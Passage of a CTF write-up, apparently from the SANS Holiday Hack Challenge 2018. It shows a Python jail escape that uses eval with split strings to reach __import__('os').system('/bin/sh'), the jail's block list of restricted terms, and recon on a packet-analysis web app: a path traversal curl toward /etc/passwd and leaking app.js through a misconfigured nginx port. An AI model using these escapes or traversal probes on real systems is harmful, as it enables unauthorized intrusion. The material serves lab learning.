<div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;impor&#39;</span> <span class="o">+</span> <span class="s1">&#39;t os&#39;</span><span class="p">)</span>
  File <span class="nb">&quot;&lt;string&gt;&quot;</span>, line <span class="m">1</span>
    <span class="kn">import</span> <span class="nn">os</span>
         <span class="o">^</span>
<span class="gr">SyntaxError</span>: <span class="n">invalid syntax</span>
</pre></div>
<p>We get a syntax error. However, it does not seem like the jail tries to block
our <code>import</code>. So, what are some other ways you can <code>import</code> in
Python, without calling <code>import</code>? By searching for write-ups of Python
jail escapes, I found this <a class="reference external" href="https://codezen.fr/2012/10/25/hack-lu-ctf-python-jail-writeup/">website</a>
where the jail blocks <code>__import__</code>. Let's see if our jail does also:</p>
<div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;__impo&#39;</span> <span class="o">+</span> <span class="s1">&#39;rt__&#39;</span><span class="p">)</span>
<span class="go">&lt;built-in function __import__&gt;</span>
</pre></div>
<p>Alright! It's not blocked. We can use <code>__import__</code> to import the
<code>os</code> module, and the call <code>system</code>, in order to gain a shell
access:</p>
<div class="highlight"><pre><span></span><span class="gp">&gt;</span>&gt;&gt; eval<span class="o">(</span><span class="s1">&#39;__imp&#39;</span>+<span class="s1">&#39;ort__(&quot;os&quot;).system(&quot;/bin/sh&quot;)&#39;</span><span class="o">)</span>
<span class="gp">$</span> ls
<span class="go">i_escaped</span>
<span class="gp">$</span> ./i_escaped
<span class="go">Loading, please wait......</span>

<span class="go">  ____        _   _</span>
<span class="go"> |  _ \ _   _| |_| |__   ___  _ __</span>
<span class="go"> | |_) | | | | __| &#39;_ \ / _ \| &#39;_ \</span>
<span class="go"> |  __/| |_| | |_| | | | (_) | | | |</span>
<span class="go"> |_|___ \__, |\__|_| |_|\___/|_| |_| _ _</span>
<span class="go"> | ____||___/___ __ _ _ __   ___  __| | |</span>
<span class="go"> |  _| / __|/ __/ _` | &#39;_ \ / _ \/ _` | |</span>
<span class="go"> | |___\__ \ (_| (_| | |_) |  __/ (_| |_|</span>
<span class="go"> |_____|___/\___\__,_| .__/ \___|\__,_(_)</span>
<span class="go">                     |_|</span>
<span class="go">That&#39;s some fancy Python hacking -</span>
<span class="go">You have sent that lizard packing!</span>
<span class="go">-SugarPlum Mary</span>

<span class="go">You escaped! Congratulations!</span>
</pre></div>
<p>For those of you that are curious, here's the code of the jail, which includes
a solution:</p>
<div class="highlight"><pre><span></span><span class="ch">#! /usr/bin/env python3</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="kn">import</span> <span class="nn">readline</span>
<span class="kn">import</span> <span class="nn">code</span>

<span class="k">try</span><span class="p">:</span>
    <span class="nb">input</span> <span class="o">=</span> <span class="nb">raw_input</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">pass</span>

<span class="n">banner</span><span class="o">=</span> <span class="s1">&#39;&#39;&#39; [snip] &#39;&#39;&#39;</span>

<span class="k">def</span> <span class="nf">readfilter</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span><span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
    <span class="n">inline</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span><span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
    <span class="c1">#warning: if any of your imports enable the blacklisted items you will expose the question to the test taker.</span>
    <span class="k">for</span> <span class="n">eachterm</span> <span class="ow">in</span> <span class="n">whitelist</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">inline</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="n">eachterm</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">):</span>
            <span class="k">return</span> <span class="n">inline</span>
    <span class="c1">#warning: removing any of the following items from this list will likely expose the question.</span>
    <span class="k">for</span> <span class="n">eachterm</span> <span class="ow">in</span> <span class="n">restricted_terms</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">eachterm</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="ow">in</span> <span class="n">inline</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">):</span>
            <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Use of the command {0} is prohibited for this question.&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">eachterm</span><span class="p">))</span>
            <span class="k">return</span> <span class="s2">&quot;&quot;</span>
    <span class="k">return</span> <span class="n">inline</span>

<span class="n">whitelist</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">restricted_terms</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;import&#39;</span><span class="p">,</span><span class="s1">&#39;pty&#39;</span><span class="p">,</span> <span class="s1">&#39;open&#39;</span><span class="p">,</span><span class="s1">&#39;exec&#39;</span><span class="p">,</span><span class="s2">&quot;compile&quot;</span><span class="p">,</span> <span class="s2">&quot;os.system&quot;</span><span class="p">,</span> <span class="s2">&quot;subprocess.&quot;</span><span class="p">,</span> <span class="s2">&quot;reload&quot;</span><span class="p">,</span> <span class="s2">&quot;__builtins__&quot;</span> <span class="p">,</span><span class="s2">&quot;__class__&quot;</span><span class="p">,</span><span class="s2">&quot;__mro__&quot;</span> <span class="p">]</span>
    <span class="n">code</span><span class="o">.</span><span class="n">interact</span><span class="p">(</span><span class="n">banner</span><span class="o">=</span><span class="n">banner</span><span class="p">,</span> <span class="n">readfunc</span><span class="o">=</span><span class="n">readfilter</span><span class="p">,</span> <span class="n">local</span><span class="o">=</span><span class="nb">locals</span><span class="p">())</span>
<span class="hll">    <span class="c1">#eval(&quot;__im&quot;+&quot;port__(&#39;p&#39;+&#39;ty&#39;).s&quot;+&quot;pawn(&#39;/bin/bash&#39;)&quot;)</span>
</span></pre></div>
</div>
<div class="section" id="packet-capture-and-analysis-website">
<h3><a class="toc-backref" href="#id35">Packet Capture and Analysis Website</a></h3>
<p>Santa has created a <a class="reference external" href="https://packalyzer.kringlecastle.com/">packet capture and analysis web site</a>, where people can upload PCAP files
to analyze them, or sniff traffic from the website for 20 seconds:</p>
<img alt="packalyzer_sniffing_traffic.png" class="align-center" src="/images/sans-christmas-challenge-2018/packalyzer_sniffing_traffic.png" />
<img alt="packalyzer_sniffing_done.png" class="align-center" src="/images/sans-christmas-challenge-2018/packalyzer_sniffing_done.png" />
<p>Sniffing traffic from the website is interesting, because we could then see
other people's traffic. Unfortunately, the only traffic we see is HTTPS, which
means that it is encrypted. If we want to decrypt it, we have to find a way to
get the server's private SSL key.</p>
<p>Since the website offers an upload functionality, I tried uploading invalid
PCAP files, in order to get code execution via a webshell. However, it did not
work. I also tried some path traversing in the <code>uploads</code> directory, but
it did not work:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> curl <span class="s1">&#39;https://packalyzer.kringlecastle.com/uploads/../../../../etc/passwd&#39;</span> -H <span class="s1">&#39;Cookie: PASESSION=287850715490745264942409679417652&#39;</span>
<span class="go">Not Found</span>
</pre></div>
<p>I tried some directory listing, but I also got an error there:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> curl <span class="s1">&#39;https://packalyzer.kringlecastle.com/uploads/&#39;</span> -H <span class="s1">&#39;Cookie: PASESSION=287850715490745264942409679417652&#39;</span>
<span class="go">Error: EISDIR: illegal operation on a directory, read</span>
<span class="gp">$</span> curl <span class="s1">&#39;https://packalyzer.kringlecastle.com/uploads/test&#39;</span> -H <span class="s1">&#39;Cookie: PASESSION=287850715490745264942409679417652&#39;</span>
<span class="go">Error: ENOENT: no such file or directory, open &#39;/opt/http2/uploads//test</span>
</pre></div>
<p>Ha! We got a different error message. The error codes <code>EISDIR</code> and
<code>ENOENT</code> indicates that the website is most likely based on Node.js. We
also learned that our web root is in <code>/opt/http2/</code>. However, we're not
closer to our goal. So let's keep digging, by looking at the source code of the
website:</p>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://packalyzer.kringlecastle.com:80/pub/js/jquery.ui.widget.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://packalyzer.kringlecastle.com:80/pub/js/jquery.iframe-transport.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://packalyzer.kringlecastle.com:80/pub/js/jquery.fileupload.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/js/materialize.min.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://packalyzer.kringlecastle.com:80/pub/js/custom.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://packalyzer.kringlecastle.com:80/pub/js/xss.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://packalyzer.kringlecastle.com:80/pub/js/loader.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</pre></div>
<p>That's kind of odd: the website loads some JavaScript files. What's odd is that
it connects to the packalyzer website using HTTPS, but on the TCP port 80,
which is usually used for plaintext HTTP. Let's investigate a little bit more
on this port. Let's try to see the content of the <code>/pub/</code> directory:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> curl <span class="s1">&#39;https://packalyzer.kringlecastle.com:80/pub/&#39;</span>
<span class="go">&lt;html&gt;</span>
<span class="go">&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;</span>
<span class="go">&lt;body bgcolor=&quot;white&quot;&gt;</span>
<span class="go">&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;</span>
<span class="hll"><span class="go">&lt;hr&gt;&lt;center&gt;nginx/1.10.3&lt;/center&gt;</span>
</span><span class="go">&lt;/body&gt;</span>
<span class="go">&lt;/html&gt;</span>
</pre></div>
<p>Huh, we didn't get the same error message as before. Here, we can see that
we're communicating with an nginx server.</p>
<p>What is most likely happening here is that there are two webservers:</p>
<ul class="simple">
<li>One listening on TCP/443, which runs the Node.js application.</li>
<li>One listening on TCP/80, which is most likely an nginx reverse proxy that
serves static files to the web application.</li>
</ul>
<p>That's interesting, maybe we can use the nginx reverse proxy to download the
server's SSL key. I tried several ideas, such as doing a path traversal to try
and download the SSL key, but it didn't work. So what other files can we try
to download. One of the most important files in a Node.js application is the
<code>app.js</code> file, which holds most of the application logic. Let's try to
download it:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> curl <span class="s1">&#39;https://packalyzer.kringlecastle.com:80/app.js&#39;</span>
<span class="gp">#</span>!/usr/bin/node
<span class="go">//pcapalyzer - The web based packet analyzer</span>
<span class="go">const cluster = require(&#39;cluster&#39;);</span>
<span class="go">const os = require(&#39;os&#39;);</span>
<span class="go">const path = require(&#39;path&#39;);</span>
<span class="go">const fs = require(&#39;fs&#39;);</span>
<span class="go">const http2 = require(&#39;http2&#39;);</span>
<span class="go">const koa = require(&#39;koa&#39;);</span>
<span class="go">const Router = require(&#39;koa-router&#39;);</span>
<span class="go">const mime = require(&#39;mime-types&#39;);</span>
<span class="go">const mongoose = require(&#39;mongoose&#39;);</span>
<span class="go">const koaBody = require(&#39;koa-body&#39;);</span>
<span class="go">const cookie = require(&#39;koa-cookie&#39;);</span>
<span class="go">const execSync = require(&#39;child_process&#39;).execSync;</span>
<span class="go">const execAsync = require(&#39;child_process&#39;).exec;</span>
<span class="go">const redis = require(&quot;redis&quot;);</span>
<span class="go">const redis_connection = redis.createClient();</span>
<span class="go">const {promisify} = require(&#39;util&#39;);</span>
<span class="go">const getAsync = promisify(redis_connection.get).bind(redis_connection);</span>
<span class="go">const setAsync = promisify(redis_connection.set).bind(redis_connection);</span>
<span class="go">const delAsync = promisify(redis_connection.del).bind(redis_connection);</span>
<span class="go">const sha1 = require(&#39;sha1&#39;);</span>
<span class="go">[snip]</span>
</pre></div>
<p>It works! Here's the full file. (There was some binary content in the middle
of the file that I removed):</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/node</span>
<span class="c1">//pcapalyzer - The web based packet analyzer</span>
<span class="kr">const</span> <span class="nx">cluster</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;cluster&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">os</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">http2</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;http2&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">koa</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;koa&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">Router</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;koa-router&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">mime</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;mime-types&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">mongoose</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;mongoose&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">koaBody</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;koa-body&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">cookie</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;koa-cookie&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">execSync</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">;</span>
<span class="kr">const</span> <span class="nx">execAsync</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">;</span>
<span class="kr">const</span> <span class="nx">redis</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&quot;redis&quot;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">redis_connection</span> <span class="o">=</span> <span class="nx">redis</span><span class="p">.</span><span class="nx">createClient</span><span class="p">();</span>
<span class="kr">const</span> <span class="p">{</span><span class="nx">promisify</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;util&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">getAsync</span> <span class="o">=</span> <span class="nx">promisify</span><span class="p">(</span><span class="nx">redis_connection</span><span class="p">.</span><span class="nx">get</span><span class="p">).</span><span class="nx">bind</span><span class="p">(</span><span class="nx">redis_connection</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">setAsync</span> <span class="o">=</span> <span class="nx">promisify</span><span class="p">(</span><span class="nx">redis_connection</span><span class="p">.</span><span class="nx">set</span><span class="p">).</span><span class="nx">bind</span><span class="p">(</span><span class="nx">redis_connection</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">delAsync</span> <span class="o">=</span> <span class="nx">promisify</span><span class="p">(</span><span class="nx">redis_connection</span><span class="p">.</span><span class="nx">del</span><span class="p">).</span><span class="nx">bind</span><span class="p">(</span><span class="nx">redis_connection</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">sha1</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;sha1&#39;</span><span class="p">);</span>
<span class="nx">require</span><span class="p">(</span><span class="s1">&#39;events&#39;</span><span class="p">).</span><span class="nx">EventEmitter</span><span class="p">.</span><span class="nx">defaultMaxListeners</span> <span class="o">=</span> <span class="kc">Infinity</span><span class="p">;</span>
<span class="kr">const</span> <span class="nx">log</span> <span class="o">=</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">;</span>
<span class="kr">const</span> <span class="nx">print</span> <span class="o">=</span> <span class="nx">log</span><span class="p">;</span>
<span class="hll"><span class="kr">const</span> <span class="nx">dev_mode</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span><span class="hll"><span class="kr">const</span> <span class="nx">key_log_path</span> <span class="o">=</span> <span class="p">(</span> <span class="o">!</span><span class="nx">dev_mode</span> <span class="o">||</span> <span class="nx">__dirname</span> <span class="o">+</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">DEV</span> <span class="o">+</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">SSLKEYLOGFILE</span> <span class="p">)</span>
</span><span class="kr">const</span> <span class="nx">options</span> <span class="o">=</span> <span class="p">{</span>
<span class="hll">  <span class="nx">key</span><span class="o">:</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">__dirname</span> <span class="o">+</span> <span class="s1">&#39;/keys/server.key&#39;</span><span class="p">),</span>
</span><span class="hll">  <span class="nx">cert</span><span class="o">:</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">__dirname</span> <span class="o">+</span> <span class="s1">&#39;/keys/server.crt&#39;</span><span class="p">),</span>
</span>  <span class="nx">http2</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">protocol</span><span class="o">:</span> <span class="s1">&#39;h2&#39;</span><span class="p">,</span>         <span class="c1">// HTTP2 only. NOT HTTP1 or HTTP1.1</span>
    <span class="nx">protocols</span><span class="o">:</span> <span class="p">[</span> <span class="s1">&#39;h2&#39;</span> <span class="p">],</span>
  <span class="p">},</span>
<span class="hll">  <span class="nx">keylog</span> <span class="o">:</span> <span class="nx">key_log_path</span>     <span class="c1">//used for dev mode to view traffic. Stores a few minutes worth at a time</span>
</span><span class="p">};</span>

<span class="c1">//==================================</span>
<span class="c1">//Standard Mongoose Connection Stuff</span>
<span class="c1">//==================================</span>
<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">koa</span><span class="p">();</span>
<span class="kr">const</span> <span class="nx">router</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Router</span><span class="p">();</span>
<span class="nx">router</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">cookie</span><span class="p">.</span><span class="k">default</span><span class="p">());</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">router</span><span class="p">.</span><span class="nx">routes</span><span class="p">()).</span><span class="nx">use</span><span class="p">(</span><span class="nx">router</span><span class="p">.</span><span class="nx">allowedMethods</span><span class="p">());</span>
<span class="nx">mongoose</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="s1">&#39;mongodb://localhost:27017/packalyzer&#39;</span><span class="p">,{</span> <span class="nx">useNewUrlParser</span><span class="o">:</span> <span class="kc">true</span> <span class="p">});</span>
<span class="kr">const</span> <span class="nx">Schema</span> <span class="o">=</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nx">Schema</span><span class="p">;</span>
<span class="kr">const</span> <span class="nx">userSchema</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Schema</span><span class="p">({</span>
  <span class="nx">name</span><span class="o">:</span> <span class="p">{</span> <span class="nx">type</span><span class="o">:</span> <span class="nb">String</span><span class="p">,</span> <span class="nx">required</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">unique</span><span class="o">:</span> <span class="kc">true</span> <span class="p">},</span>
  <span class="nx">email</span><span class="o">:</span> <span class="p">{</span> <span class="nx">type</span><span class="o">:</span> <span class="nb">String</span><span class="p">,</span> <span class="nx">required</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">unique</span><span class="o">:</span> <span class="kc">true</span> <span class="p">},</span>
  <span class="nx">password</span><span class="o">:</span> <span class="p">{</span> <span class="nx">type</span><span class="o">:</span> <span class="nb">String</span><span class="p">,</span> <span class="nx">required</span><span class="o">:</span> <span class="kc">true</span> <span class="p">},</span>
  <span class="nx">is_admin</span><span class="o">:</span> <span class="p">{</span> <span class="nx">type</span><span class="o">:</span> <span class="nb">Boolean</span><span class="p">,</span> <span class="nx">required</span><span class="o">:</span> <span class="kc">true</span> <span class="p">},</span>
  <span class="nx">captures</span><span class="o">:</span> <span class="p">{</span> <span class="nx">type</span><span class="o">:</span> <span class="nb">Array</span><span class="p">,</span> <span class="nx">required</span><span class="o">:</span> <span class="kc">true</span> <span class="p">},</span>
<span class="p">});</span>
<span class="kr">const</span> <span class="nx">Users</span> <span class="o">=</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nx">model</span><span class="p">(</span><span class="s1">&#39;Users&#39;</span><span class="p">,</span> <span class="nx">userSchema</span><span class="p">);</span>
<span class="c1">//Sets Users to be allowed to sniff or just admins</span>
<span class="kr">const</span> <span class="nx">Allow_All_To_Sniff</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>

<span class="c1">//==================================</span>
<span class="c1">//Standard Mongoose Connection Stuff</span>
<span class="c1">//==================================</span>

<span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">clean</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">deleteValue</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="k">this</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">==</span> <span class="nx">deleteValue</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">splice</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
      <span class="nx">i</span><span class="o">--</span><span class="p">;</span>
      <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="k">this</span><span class="p">;</span>
<span class="p">};</span>
<span class="kd">var</span> <span class="nx">uniqueArray</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">arrArg</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nx">arrArg</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">elem</span><span class="p">,</span> <span class="nx">pos</span><span class="p">,</span><span class="nx">arr</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">arr</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">elem</span><span class="p">)</span> <span class="o">==</span> <span class="nx">pos</span><span class="p">;</span>
  <span class="p">});</span>
<span class="p">};</span>
<span class="kd">function</span> <span class="nx">load_envs</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">dirs</span> <span class="o">=</span> <span class="p">[]</span>
  <span class="kd">var</span> <span class="nx">env_keys</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">)</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">env_keys</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">[</span><span class="nx">env_keys</span><span class="p">[</span><span class="nx">i</span><span class="p">]]</span> <span class="o">===</span> <span class="s2">&quot;string&quot;</span> <span class="p">)</span> <span class="p">{</span>
      <span class="nx">dirs</span><span class="p">.</span><span class="nx">push</span><span class="p">((</span> <span class="s2">&quot;/&quot;</span><span class="o">+</span><span class="nx">env_keys</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">toLowerCase</span><span class="p">()</span><span class="o">+</span><span class="s1">&#39;/*&#39;</span><span class="p">)</span> <span class="p">)</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="nx">uniqueArray</span><span class="p">(</span><span class="nx">dirs</span><span class="p">)</span>
<span class="p">}</span>
<span class="hll"><span class="k">if</span> <span class="p">(</span><span class="nx">dev_mode</span><span class="p">)</span> <span class="p">{</span>
</span><span class="hll">    <span class="c1">//Can set env variable to open up directories during dev</span>
</span><span class="hll">    <span class="kr">const</span> <span class="nx">env_dirs</span> <span class="o">=</span> <span class="nx">load_envs</span><span class="p">();</span>
</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">env_dirs</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;/pub/&#39;</span><span class="p">,</span><span class="s1">&#39;/uploads/&#39;</span><span class="p">];</span>
<span class="p">}</span>

<span class="kr">const</span> <span class="nx">api_functions</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;login&#39;</span><span class="o">:</span><span class="nx">login</span><span class="p">,</span>
    <span class="s1">&#39;logout&#39;</span><span class="o">:</span><span class="nx">logout</span><span class="p">,</span>
    <span class="s1">&#39;users&#39;</span><span class="o">:</span><span class="nx">find_users</span><span class="p">,</span>
    <span class="s1">&#39;register&#39;</span><span class="o">:</span><span class="nx">register</span><span class="p">,</span>
    <span class="s1">&#39;upload&#39;</span><span class="o">:</span><span class="nx">upload</span><span class="p">,</span>
    <span class="s1">&#39;list&#39;</span><span class="o">:</span><span class="nx">list_caps</span><span class="p">,</span>
    <span class="s1">&#39;delete&#39;</span><span class="o">:</span><span class="nx">delete_caps</span><span class="p">,</span>
    <span class="s1">&#39;sniff&#39;</span><span class="o">:</span><span class="nx">sniff_traffic</span><span class="p">,</span>
    <span class="s1">&#39;process&#39;</span><span class="o">:</span><span class="nx">start_process</span><span class="p">,</span>
  <span class="p">}</span>
  <span class="kr">const</span> <span class="nx">api_function</span> <span class="o">=</span> <span class="nx">async</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">Session</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">sessionizer</span><span class="p">(</span><span class="nx">ctx</span><span class="p">);</span>
